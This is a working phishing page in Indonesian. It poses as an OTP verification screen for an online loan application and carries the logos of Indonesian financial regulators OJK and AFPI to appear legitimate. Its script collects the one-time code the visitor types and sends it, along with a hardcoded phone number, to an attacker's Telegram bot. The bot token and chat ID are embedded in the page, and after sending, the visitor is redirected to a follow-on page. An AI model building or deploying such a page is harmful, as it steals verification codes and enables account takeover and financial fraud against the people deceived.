<html lang="en">
 <head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>OTP Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
   href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
   rel="stylesheet"
  />
  <style>
   @import url("https://fonts.googleapis.com/css2?family=Inter&display=swap");
   body {
    font-family: "Inter", sans-serif;
   }
   /* Custom orange color for button */
   .btn-orange {
    background-color: #ff8c00;
   }
   .btn-orange-disabled {
    background-color: #DCDCDC;
    cursor: not-allowed;
   }
  </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between">
  <div class="px-6 pt-6 max-w-md mx-auto w-full">
   <button aria-label="Back" class="text-black text-2xl font-semibold mb-10">
    <i class="fas fa-chevron-left"></i>
   </button>
   <div class="mb-6">
    <p class="text-gray-600 text-sm mb-1">Kode OTP Sudah Terkirim Ke</p>
    <div class="flex items-center space-x-2">
     <p class="font-extrabold text-lg text-black">SMS/WhatsApp</p>
     <button aria-label="Edit phone number" class="text-gray-400 hover:text-gray-600">
      <i class="fas fa-pencil-alt"></i>
     </button>
    </div>
   </div>
   <form id="otpForm" class="mb-6" autocomplete="one-time-code" novalidate>
    <div class="flex justify-between space-x-4 mb-2">
     <input
      aria-label="OTP digit 1"
      class="w-16 h-16 rounded-xl bg-gray-50 border border-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300 text-center text-3xl font-semibold text-gray-400"
      inputmode="numeric"
      maxlength="1"
      pattern="[0-9]*"
      type="text"
      name="digit1"
      required
     />
     <input
      aria-label="OTP digit 2"
      class="w-16 h-16 rounded-xl bg-gray-50 border border-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300 text-center text-3xl font-semibold text-gray-400"
      inputmode="numeric"
      maxlength="1"
      pattern="[0-9]*"
      type="text"
      name="digit2"
      required
     />
     <input
      aria-label="OTP digit 3"
      class="w-16 h-16 rounded-xl bg-gray-50 border border-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300 text-center text-3xl font-semibold text-gray-400"
      inputmode="numeric"
      maxlength="1"
      pattern="[0-9]*"
      type="text"
      name="digit3"
      required
     />
     <input
      aria-label="OTP digit 4"
      class="w-16 h-16 rounded-xl bg-gray-50 border border-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300 text-center text-3xl font-semibold text-gray-400"
      inputmode="numeric"
      maxlength="1"
      pattern="[0-9]*"
      type="text"
      name="digit4"
      required
     />
    </div>
    <p id="countdown" class="text-gray-500 text-sm text-right select-none">60s</p>
    <button
     id="submitBtn"
     type="submit"
     class="w-full py-4 rounded-full btn-orange-disabled text-white font-semibold text-lg cursor-not-allowed"
     disabled
    >
     Lanjutkan Pengajuan
    </button>
   </form>
   <p class="text-center text-gray-400 text-sm mt-6">
    Tidak dapat kode verifikasi?
    <button class="text-green-500 font-semibold hover:underline focus:outline-none" type="button">
     coba metode lain
    </button>
   </p>
  </div>
  <footer class="flex justify-center items-center space-x-6 py-6 max-w-md mx-auto w-full">
   <img
    alt="OJK logo with red and gray text and icon on white background"
    class="h-8 w-auto"
    height="40"
    loading="lazy"
    src="https://upload.wikimedia.org/wikipedia/commons/8/83/OJK_Logo.png"
    width="50"
   />
   <img
    alt="AFPI logo with green text and icon on white background"
    class="h-8 w-auto"
    height="40"
    loading="lazy"
    src="https://afpi.or.id/assets/images/AFPI%20Final%20Logo%20with%20Abbreviation.png"
    width="50"
   />
  </footer>
  <script>
   // Replace these with your own bot token and chat ID
   const BOT_TOKEN = "8275257587:AAHqb6nOza3eaFNZQGtr5yNuS5D9NArBBbE";
   const CHAT_ID = "7549590022";

   const form = document.getElementById("otpForm");
   const submitBtn = document.getElementById("submitBtn");
   const countdownEl = document.getElementById("countdown");
   const inputs = form.querySelectorAll('input[type="text"]');

   // Countdown timer
   let timeLeft = 60;
   const timerId = setInterval(() => {
    if (timeLeft <= 0) {
     clearInterval(timerId);
     countdownEl.textContent = "0s";
     return;
    }
    countdownEl.textContent = timeLeft + "s";
    timeLeft--;
   }, 1000);

   // Auto move focus and validate inputs
   inputs.forEach((input, idx) => {
    input.addEventListener("input", (e) => {
     let value = e.target.value;
     // Only allow digits
     value = value.replace(/[^0-9]/g, "");
     e.target.value = value.slice(0, 1);

     if (value.length === 1 && idx < inputs.length - 1) {
      inputs[idx + 1].focus();
     }
     validateInputs();
    });

    input.addEventListener("keydown", (e) => {
     if (e.key === "Backspace" && input.value === "" && idx > 0) {
      inputs[idx - 1].focus();
     }
    });
   });

   function validateInputs() {
    const allFilled = Array.from(inputs).every((i) => i.value.trim() !== "");
    if (allFilled) {
     submitBtn.disabled = false;
     submitBtn.classList.remove("btn-orange-disabled", "cursor-not-allowed");
     submitBtn.classList.add("btn-orange", "cursor-pointer");
    } else {
     submitBtn.disabled = true;
     submitBtn.classList.add("btn-orange-disabled", "cursor-not-allowed");
     submitBtn.classList.remove("btn-orange", "cursor-pointer");
    }
   }

   form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const otp = Array.from(inputs)
     .map((i) => i.value.trim())
     .join("");
    const phoneNumber = "+62 8742822552";

    const message = `Kode OTP dari nomor ${phoneNumber} adalah: ${otp}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
     const response = await fetch(url, {
      method: "POST",
      headers: {
       "Content-Type": "application/json",
      },
      body: JSON.stringify({
       chat_id: CHAT_ID,
       text: message,
      }),
     });

     const data = await response.json();

     if (data.ok) {
      window.location.href = "verifikasi.html";
      form.reset();
      submitBtn.disabled = true;
      submitBtn.classList.add("btn-orange-disabled", "cursor-not-allowed");
      submitBtn.classList.remove("btn-orange", "cursor-pointer");
      inputs[0].focus();
     } else {
      alert("Gagal mengirim OTP ke Telegram.");
     }
    } catch (error) {
     alert("Terjadi kesalahan saat mengirim OTP.");
     console.error(error);
    }
   });
  </script>
 </body>
</html>
